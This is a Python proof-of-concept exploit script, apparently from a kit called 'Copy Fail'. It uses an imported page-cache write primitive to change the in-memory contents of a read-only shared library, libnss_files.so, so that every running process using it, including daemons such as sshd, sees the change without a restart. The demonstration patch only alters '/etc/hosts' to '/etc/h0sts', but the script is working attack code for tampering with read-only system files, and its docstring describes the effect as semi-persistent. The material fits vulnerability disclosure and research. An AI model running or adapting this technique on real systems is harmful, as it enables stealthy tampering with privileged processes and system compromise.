#!/usr/bin/env python3
"""
Copy Fail — Shared library live-patching
==========================================
Demonstrates that modifying a shared library's page cache affects
all running processes that have it loaded via mmap(MAP_PRIVATE),
WITHOUT requiring a restart.

This script patches a string in libnss_files.so (the NSS resolver library)
to prove the concept non-destructively. A monitor program running in the
background observes the change in real time.

Background: Linux loads .so files via mmap(MAP_PRIVATE), mapping process
page tables directly to page cache physical pages. Modifying the page cache
is equivalent to modifying the code/data of all processes using that library.
x86 cache coherency ensures the write is immediately visible to all cores.

Semi-persistent: system daemons (sshd, crond, dockerd, etc.) hold mmap
references, preventing drop_caches from evicting the modified pages.

Tested on: CentOS Stream 8 (libnss_files-2.28.so, 54360 bytes)

Step 1: Run the monitor (see exp_shared_lib_monitor.c)
Step 2: Run this script to tamper the .so page cache
Step 3: Observe the monitor detecting the change without restart
"""
import os
import sys
import subprocess
from copyfail_core import page_cache_write

DEFAULT_SO = "/usr/lib64/libnss_files-2.28.so"
if not os.path.exists(DEFAULT_SO):
    DEFAULT_SO = "/usr/lib64/libnss_files.so.2"
if not os.path.exists(DEFAULT_SO):
    DEFAULT_SO = "/lib/x86_64-linux-gnu/libnss_files.so.2"

TARGET_STRING = b"/etc/hosts"
PATCHED_STRING = b"/etc/h0sts"  # harmless: only changes 'o' → '0'


def find_string_offset(path, target):
    """Find the offset of a string in the .rodata section."""
    with open(path, "rb") as f:
        data = f.read()
    pos = data.find(target)
    if pos < 0:
        return None
    return pos


def main():
    so_path = sys.argv[1] if len(sys.argv) > 1 else DEFAULT_SO
    if not os.path.isfile(so_path):
        print(f"[-] {so_path} not found")
        sys.exit(1)

    offset = find_string_offset(so_path, TARGET_STRING)
    if offset is None:
        print(f"[-] String '{TARGET_STRING.decode()}' not found in {so_path}")
        sys.exit(1)

    # Patch only the differing bytes (offset of 'o' in "host" → '0')
    # "/etc/hosts" → "/etc/h0sts": byte at offset+6 changes from 'o'(0x6f) to '0'(0x30)
    patch_offset = offset + 6  # position of 'o' in "hosts"
    fd = os.open(so_path, os.O_RDONLY)

    os.lseek(fd, patch_offset, os.SEEK_SET)
    before = os.read(fd, 4)
    print(f"[*] Target: {so_path}")
    print(f"[*] String offset: 0x{offset:x}")
    print(f"[*] Patch offset: 0x{patch_offset:x}")
    print(f"[*] Before: {before}")

    patch = b'0' + before[1:]  # only change first byte: 'o' → '0'
    page_cache_write_4bytes_import = __import__("copyfail_core").page_cache_write_4bytes
    page_cache_write_4bytes_import(fd, patch_offset, patch)

    os.lseek(fd, offset, os.SEEK_SET)
    result = os.read(fd, len(TARGET_STRING))
    os.close(fd)

    if result == PATCHED_STRING:
        print(f"[+] SUCCESS: '{TARGET_STRING.decode()}' → '{result.decode()}' in page cache")
        print(f"[*] All running processes with {os.path.basename(so_path)} loaded now see the change")
        print(f"[*] Restore: yum reinstall glibc-common (replaces inode, invalidates cache)")
    else:
        print(f"[-] Unexpected result: {result}")


if __name__ == "__main__":
    main()
